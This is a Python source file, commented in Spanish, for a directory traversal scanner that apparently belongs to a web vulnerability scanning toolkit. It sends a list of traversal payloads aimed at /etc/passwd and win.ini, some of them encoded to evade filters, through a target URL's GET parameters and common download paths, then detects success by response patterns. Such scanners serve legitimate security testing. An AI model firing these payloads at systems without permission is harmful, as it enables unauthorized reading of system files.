"""
Escáner de Directory Traversal
"""
import sys
from typing import List, Dict
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse


class DirectoryTraversalScanner:
    """Escáner para detectar vulnerabilidades de directory traversal"""
    
    # Payloads de directory traversal
    TRAVERSAL_PAYLOADS = [
        "../etc/passwd",
        "../../etc/passwd",
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "....\\\\....\\\\....\\\\windows\\win.ini",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd"
    ]
    
    # Patrones que indican éxito
    SUCCESS_PATTERNS = [
        'root:',  # /etc/passwd
        '[extensions]',  # win.ini
        'for 16-bit app support',  # win.ini
        '[fonts]',  # win.ini
        'daemon:',  # /etc/passwd
        'bin:',  # /etc/passwd
    ]
    
    def __init__(self, http_client, reporter):
        self.http_client = http_client
        self.reporter = reporter
        self.vulnerabilities = []
    
    def scan(self, target_url: str) -> List[Dict]:
        """Escanear objetivo en busca de directory traversal"""
        self.reporter.print_header(f"DIRECTORY TRAVERSAL SCAN - {target_url}")
        self.vulnerabilities = []
        
        # Escanear parámetros GET
        self._scan_get_params(target_url)
        
        # Probar rutas comunes
        self._scan_common_paths(target_url)
        
        if self.vulnerabilities:
            self.reporter.print_warning(f"Encontradas {len(self.vulnerabilities)} posibles vulnerabilidades de Directory Traversal")
        else:
            self.reporter.print_success("No se detectaron vulnerabilidades de Directory Traversal evidentes")
        
        return self.vulnerabilities
    
    def _scan_get_params(self, url: str):
        """Escanear parámetros GET"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            return
        
        self.reporter.print_info("Probando parámetros GET...")
        
        # Buscar parámetros que puedan ser rutas de archivo
        file_params = []
        for param_name, values in params.items():
            param_lower = param_name.lower()
            if any(keyword in param_lower for keyword in ['file', 'path', 'page', 'include', 'doc', 'document']):
                file_params.append(param_name)
        
        if not file_params:
            # Si no hay parámetros obvios, probar todos
            file_params = list(params.keys())
        
        for param_name in file_params:
            for payload in self.TRAVERSAL_PAYLOADS:
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                # Reconstruir URL con payload
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))
                
                response = self.http_client.get(test_url)
                if response and self._check_traversal_success(response.text):
                    vuln = {
                        'type': 'Directory Traversal',
                        'method': 'GET',
                        'parameter': param_name,
                        'payload': payload,
                        'url': test_url,
                        'details': f'Parámetro vulnerable: {param_name} permite lectura de archivos con: {payload}'
                    }
                    self.vulnerabilities.append(vuln)
                    self.reporter.print_vulnerability('Directory Traversal (GET)', vuln['details'])
                    break  # No probar más payloads para este parámetro
    
    def _scan_common_paths(self, url: str):
        """Probar rutas comunes vulnerables"""
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        self.reporter.print_info("Probando rutas comunes...")
        
        # Rutas comunes que pueden ser vulnerables
        common_paths = [
            '/download?file=',
            '/file?name=',
            '/view?page=',
            '/include?file=',
            '/get?file=',
            '/read?document='
        ]
        
        for path in common_paths:
            for payload in self.TRAVERSAL_PAYLOADS[:5]:  # Limitar payloads
                test_url = base_url + path + payload
                response = self.http_client.get(test_url)
                
                if response and response.status_code == 200:
                    if self._check_traversal_success(response.text):
                        vuln = {
                            'type': 'Directory Traversal',
                            'method': 'GET',
                            'path': path,
                            'payload': payload,
                            'url': test_url,
                            'details': f'Ruta vulnerable encontrada: {path} permite lectura de archivos'
                        }
                        self.vulnerabilities.append(vuln)
                        self.reporter.print_vulnerability('Directory Traversal (Path)', vuln['details'])
                        break
    
    def _check_traversal_success(self, response_text: str) -> bool:
        """Verificar si el directory traversal fue exitoso"""
        for pattern in self.SUCCESS_PATTERNS:
            if pattern in response_text:
                return True
        return False


def main():
    """Función principal para ejecución standalone"""
    if len(sys.argv) < 2:
        print("Uso: python directory_traversal.py <url>")
        sys.exit(1)
    
    from utils.http_client import HTTPClient
    from utils.reporter import Reporter
    
    target = sys.argv[1]
    client = HTTPClient()
    reporter = Reporter()
    
    scanner = DirectoryTraversalScanner(client, reporter)
    vulnerabilities = scanner.scan(target)
    
    client.close()
    
    if vulnerabilities:
        sys.exit(1)
    sys.exit(0)


if __name__ == '__main__':
    main()
